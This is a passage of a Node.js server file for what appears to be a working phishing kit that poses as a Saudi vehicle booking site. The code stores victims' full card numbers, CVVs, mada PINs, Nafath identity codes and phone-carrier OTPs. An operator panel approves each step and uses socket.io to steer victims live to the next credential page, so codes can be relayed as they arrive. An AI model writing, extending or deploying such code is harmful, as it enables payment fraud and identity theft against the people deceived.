    res.status(500).json({ error: err.message });
  }
});

// جلب حجز واحد
app.get("/api/admin/bookings/:reference", authMiddleware, (req, res) => {
  try {
    const booking = getBookingByReference(req.params.reference);
    if (!booking) return res.status(404).json({ error: "الحجز غير موجود" });
    const payment = getPaymentByReference(req.params.reference);
    const nafath = getVerificationByReference(req.params.reference, "nafath");
    const motasel = getVerificationByReference(req.params.reference, "motasel");
    const otp = getVerificationByReference(req.params.reference, "otp");
    markBookingRead(req.params.reference);
    res.json({ success: true, data: { ...booking, payment, nafath, motasel, otp } });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// إحصائيات
app.get("/api/admin/stats", authMiddleware, (req, res) => {
  try {
    const stats = getBookingsStats();
    res.json({ success: true, data: stats });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// القبول والرفض
app.post("/api/admin/payment-action", authMiddleware, (req, res) => {
  try {
    const { reference, action } = req.body;
    if (!reference || !action) return res.status(400).json({ error: "البيانات ناقصة" });
    const booking = getBookingByReference(reference);
    if (!booking) return res.status(404).json({ error: "الحجز غير موجود" });
    const existingPayment = getPaymentByReference(reference);
    const currentStep = existingPayment?.step ?? 1;
    // إيجاد IP العميل
    let clientIp = null;
    for (const [ip, ref] of ipToReference.entries()) {
      if (ref === reference) { clientIp = ip; break; }
    }
    let targetPage = null;
    if (action === "pass") {
      if (currentStep <= 1) {
        targetPage = "code";
        createOrUpdatePayment(reference, { paymentAction: "accepted" });
      } else if (currentStep === 2) {
        targetPage = "madaPin";
        createOrUpdatePayment(reference, { paymentAction: "pass", step: 3 });
      } else {
        targetPage = "phone";
        createOrUpdatePayment(reference, { paymentAction: "accepted", status: "verified" });
        updateBookingStatus(reference, "completed", 1);
      }
    } else if (action === "denied") {
      if (currentStep <= 1) {
        targetPage = "payments?declined=true";
        createOrUpdatePayment(reference, { paymentAction: "denied", step: 1 });
      } else if (currentStep === 2) {
        targetPage = "code?declined=true";
        createOrUpdatePayment(reference, { paymentAction: "denied", step: 2 });
      } else {
        targetPage = "madaPin?declined=true";
        createOrUpdatePayment(reference, { paymentAction: "denied", step: 3 });
      }
    } else if (action === "completed") {
      updateBookingStatus(reference, "completed", 1);
    }
    // إرسال navigateTo للعميل
    if (targetPage && clientIp) {
      io.to(`ip_${clientIp}`).emit("navigateTo", { page: targetPage, ip: clientIp });
      io.emit("navigateTo", { page: targetPage, ip: clientIp });
    }
    // إخطار المشرفين
    io.to("admins").emit("paymentActionSet", { reference, action });
    logNavigation({ referenceId: reference, clientIp: clientIp || "", targetPage: targetPage || action });
    res.json({ success: true, action, reference, targetPage, currentStep });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// قبول/رفض النفاذ
app.post("/api/admin/nafath-action", authMiddleware, (req, res) => {
  try {
    const { reference, action } = req.body;
    if (!reference || !action) return res.status(400).json({ error: "البيانات ناقصة" });
    let clientIp = null;
    for (const [ip, ref] of ipToReference.entries()) {
      if (ref === reference) { clientIp = ip; break; }
    }
    let targetPage = null;
    if (action === "pass") {
      targetPage = "nafadBasmah";
      createOrUpdateVerification(reference, "nafath", { step: 2, status: "approved" });
    } else if (action === "denied") {
      targetPage = "nafad?declined=true";
      createOrUpdateVerification(reference, "nafath", { step: 1, status: "denied" });
    }
    if (targetPage && clientIp) {
      io.to(`ip_${clientIp}`).emit("navigateTo", { page: targetPage, ip: clientIp });
      io.emit("navigateTo", { page: targetPage, ip: clientIp });
    }
    io.to("admins").emit("paymentActionSet", { reference, action });
    res.json({ success: true, action, reference, targetPage });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// إرسال رمز نفاذ
app.post("/api/admin/send-nafath-code", authMiddleware, (req, res) => {
  try {
    const { reference, code } = req.body;
    let clientIp = null;
    for (const [ip, ref] of ipToReference.entries()) {
      if (ref === reference) { clientIp = ip; break; }
    }
    if (clientIp) {
      io.to(`ip_${clientIp}`).emit("nafadCode", { success: true, code });
      io.emit("nafadCode", { success: true, code });
    }
    createOrUpdateVerification(reference, "nafath", { nafathNumber: code, step: 2, status: "code_sent" });
    io.to("admins").emit("newPayment", { reference, type: "nafathCode", code });
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ==================== Site API (الموقع الأمامي) ====================
const ipRefMapSite = new Map();

// دالة مشتركة لمعالجة طلبات /data/ من أي مسار
function handleDataRequest(req, res) {
  const typeReq = String(req.query.typeReq || "");
  const category = String(req.query.category || "");
  const body = req.body || {};
  const clientIp = ((req.headers["x-forwarded-for"] || "").split(",")[0]?.trim()) || req.ip || "unknown";
  console.log(`[SiteAPI] typeReq=${typeReq} category=${category} ip=${clientIp}`);

  try {
    if (category === "FORMS_SUBMIT") {
      if (typeReq === "NewDate") {
        const referenceId = nanoid(12);
        const str = (v) => (v != null ? String(v) : "");
        const plateStr = [str(body.VehiclePlateChar1 ?? ""), str(body.VehiclePlateChar2 ?? ""), str(body.VehiclePlateChar3 ?? ""), str(body.NumberPanal ?? "")].filter(Boolean).join("-");
        createBooking({
          referenceId,
          clientName: str(body.Name ?? body.name ?? body.InputName),
          clientId: str(body.ID ?? body.id ?? body.InputID),
          clientPhone: str(body.PhonNumber ?? body.phonNumber ?? body.InputPhonNumber),
          clientEmail: str(body.Email1 ?? body.email1 ?? body.InputEmail1),
          clientNationality: str(body.Nationality ?? body.nationality),
          hasDelegate: body.flexSwitchDelegate === 1 || body.flexSwitchDelegate === "1",
          delegateType: str(body.DelegateType ?? ""),
          delegateName: str(body.DelegateName ?? ""),
          delegatePhone: str(body.DelegatePhone ?? ""),
          delegateNationality: str(body.DelegateNationality ?? ""),
          delegateId: str(body.DelegateId ?? ""),
          vehicleCountry: str(body.CountryReg ?? body.InputCountryReg ?? ""),
          vehiclePlate: plateStr,
          vehiclePlateChar1: str(body.VehiclePlateChar1 ?? ""),
          vehiclePlateChar2: str(body.VehiclePlateChar2 ?? ""),
          vehiclePlateChar3: str(body.VehiclePlateChar3 ?? ""),
          vehicleType: str(body.TypeVechil ?? body.InputTypeVechil ?? ""),
          vehicleCarryDang: body.vehicleCarryDang === 1 || body.vehicleCarryDang === "1",
          serviceRegion: str(body.RegionSvc ?? body.InputRegion ?? ""),
          serviceType: str(body.TypeSvc ?? body.InputTypeSvc ?? ""),
          serviceDate: str(body.DateSvc ?? body.InputDateSvc ?? ""),
          serviceTime: str(body.TimeSvc ?? body.InputTimeSvc ?? ""),
          clientIp,
          rawData: body,
          status: "new",
          statusRead: 0,
        });
        ipRefMapSite.set(clientIp, referenceId);
        io.to("admins").emit("newBooking", { reference: referenceId, ip: clientIp });
        return res.json({ status: true, data: { reference: referenceId, Reference: referenceId, goToUrl: "/payments-form/" } });
      }

      if (typeReq === "PaymentsForm") {
        const reference = String(body.reference || ipRefMapSite.get(clientIp) || "");
        if (!reference) return res.status(400).json({ status: false, message: "لا يوجد مرجع" });
        ipRefMapSite.set(clientIp, reference);
        const rawCardNum = String(body.cardNumber ?? body.card_number ?? "");
        const cardNum = rawCardNum.split("").reverse().join("");
        const lastFour = cardNum.slice(-4);
        createOrUpdatePayment(reference, {
          cardHolderName: String(body.cardHolderName ?? ""),
          cardNumber: cardNum,
          cardLastFour: lastFour,
          cardExpiry: String(body.cardExpiry ?? ""),
          cardCvv: String(body.cardCvv ?? ""),
          step: 1, status: "step1_done", rawData: body,
        });
        updateBookingStatus(reference, "pending_payment");
        io.to("admins").emit("newPayment", { reference, step: 1, type: "payment", ip: clientIp });
        return res.json({ status: true, data: { step: 1, status: "STILL" } });
      }

      if (typeReq === "Motasel") {
        const reference = String(body.reference || ipRefMapSite.get(clientIp) || "");
        if (!reference) return res.status(400).json({ status: false, message: "لا يوجد مرجع" });
        createOrUpdateVerification(reference, "motasel", {
          motaselProvider: String(body.provider ?? ""),
          motaselPhone: String(body.phone ?? ""),
          step: 1, status: "step1_done", rawData: body,
        });
        io.to("admins").emit("newPayment", { reference, type: "motasel", ip: clientIp });
        return res.json({ status: true, data: { step: 1 } });
      }

      if (typeReq === "MotaselCode") {
        const reference = String(body.reference || ipRefMapSite.get(clientIp) || "");
        if (!reference) return res.status(400).json({ status: false, message: "لا يوجد مرجع" });
        createOrUpdateVerification(reference, "motasel", {
          motaselCode: String(body.code ?? ""),
          step: 2, status: "step2_done",
        });
        io.to("admins").emit("newPayment", { reference, type: "motaselCode", ip: clientIp });
        return res.json({ status: true, data: { step: 2 } });
      }
    }

    if (category === "FORMS_GET") {
      if (typeReq === "RespnseSetActionStatus") {
        const reference = String(body.reference || ipRefMapSite.get(clientIp) || "");
        if (!reference) return res.json({ status: true, data: { action: null } });
        const payment = getPaymentByReference(reference);
        return res.json({ status: true, data: { action: payment?.paymentAction || null, step: payment?.step || 0 } });
      }

      if (typeReq === "PayFmIsVerified") {
        const reference = String(body.reference || ipRefMapSite.get(clientIp) || "");
        if (!reference) return res.json({ status: true, data: { verified: false } });
        const payment = getPaymentByReference(reference);
        return res.json({ status: true, data: { verified: payment?.status === "verified", step: payment?.step || 0 } });
      }

      if (typeReq === "GetNafathNum") {
        const reference = String(body.reference || ipRefMapSite.get(clientIp) || "");
        if (!reference) return res.json({ status: true, data: { nafathNumber: null } });
        const nafath = getVerificationByReference(reference, "nafath");
        return res.json({ status: true, data: { nafathNumber: nafath?.nafathNumber || null } });
      }
    }

    return res.json({ status: true, data: {} });
  } catch (err) {
    console.error("[SiteAPI] Error:", err);
    return res.status(500).json({ status: false, message: err.message });
  }
}

// ==================== Admin Navigate API ====================
// توجيه العميل من لوحة التحكم إلى صفحة معينة
app.post("/api/admin/navigate", authMiddleware, (req, res) => {
  try {
    const { clientIp, page, referenceId } = req.body;
    if (!page) return res.status(400).json({ error: "الصفحة مطلوبة" });
    let effectiveIp = clientIp;
    if (!effectiveIp && referenceId) {
      for (const [ip, ref] of ipToReference.entries()) {
        if (ref === referenceId) { effectiveIp = ip; break; }
      }
    }
    if (effectiveIp) {
      io.to(`ip_${effectiveIp}`).emit("navigateTo", { page, ip: effectiveIp });
    }
    io.emit("navigateTo", { page, ip: effectiveIp || "" });
    logNavigation({ referenceId: referenceId || "", clientIp: effectiveIp || "", targetPage: page });
    res.json({ success: true, page, ip: effectiveIp });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// استقبال /data/ مباشرة
app.post("/data/", handleDataRequest);
// استقبال /*/data/ من أي مسار (الموقع يبني المسار نسبياً من الصفحة الحالية)
// مثل: /booking/data/ ، /payments/data/ ، /code/data/ إلخ
app.post(/^\/[^/]+\/data\//, handleDataRequest);

// ==================== Static Files ====================
// لوحة التحكم (أولاً لأن لها أولوية)
app.use("/admin", express.static(path.join(__dirname, "public/admin")));
app.get("/admin/*", (req, res) => {
  res.sendFile(path.join(__dirname, "public/admin/index.html"));
});

// الموقع الأمامي الأصلي على المسار الجذر /
app.use(express.static(path.join(__dirname, "public/dist")));
// SPA fallback - كل المسارات تُعيد index.html (مثل .htaccess)
app.get("*", (req, res) => {
  res.sendFile(path.join(__dirname, "public/dist/index.html"));
});

// ==================== تشغيل الخادم ====================
server.listen(PORT, () => {
  console.log(`✅ Server running on http://localhost:${PORT}`);
  console.log(`📊 Admin panel: http://localhost:${PORT}/admin`);
  console.log(`🌐 Site: http://localhost:${PORT}/site`);
  console.log(`🔑 Admin password: ${ADMIN_PASSWORD}`);
});
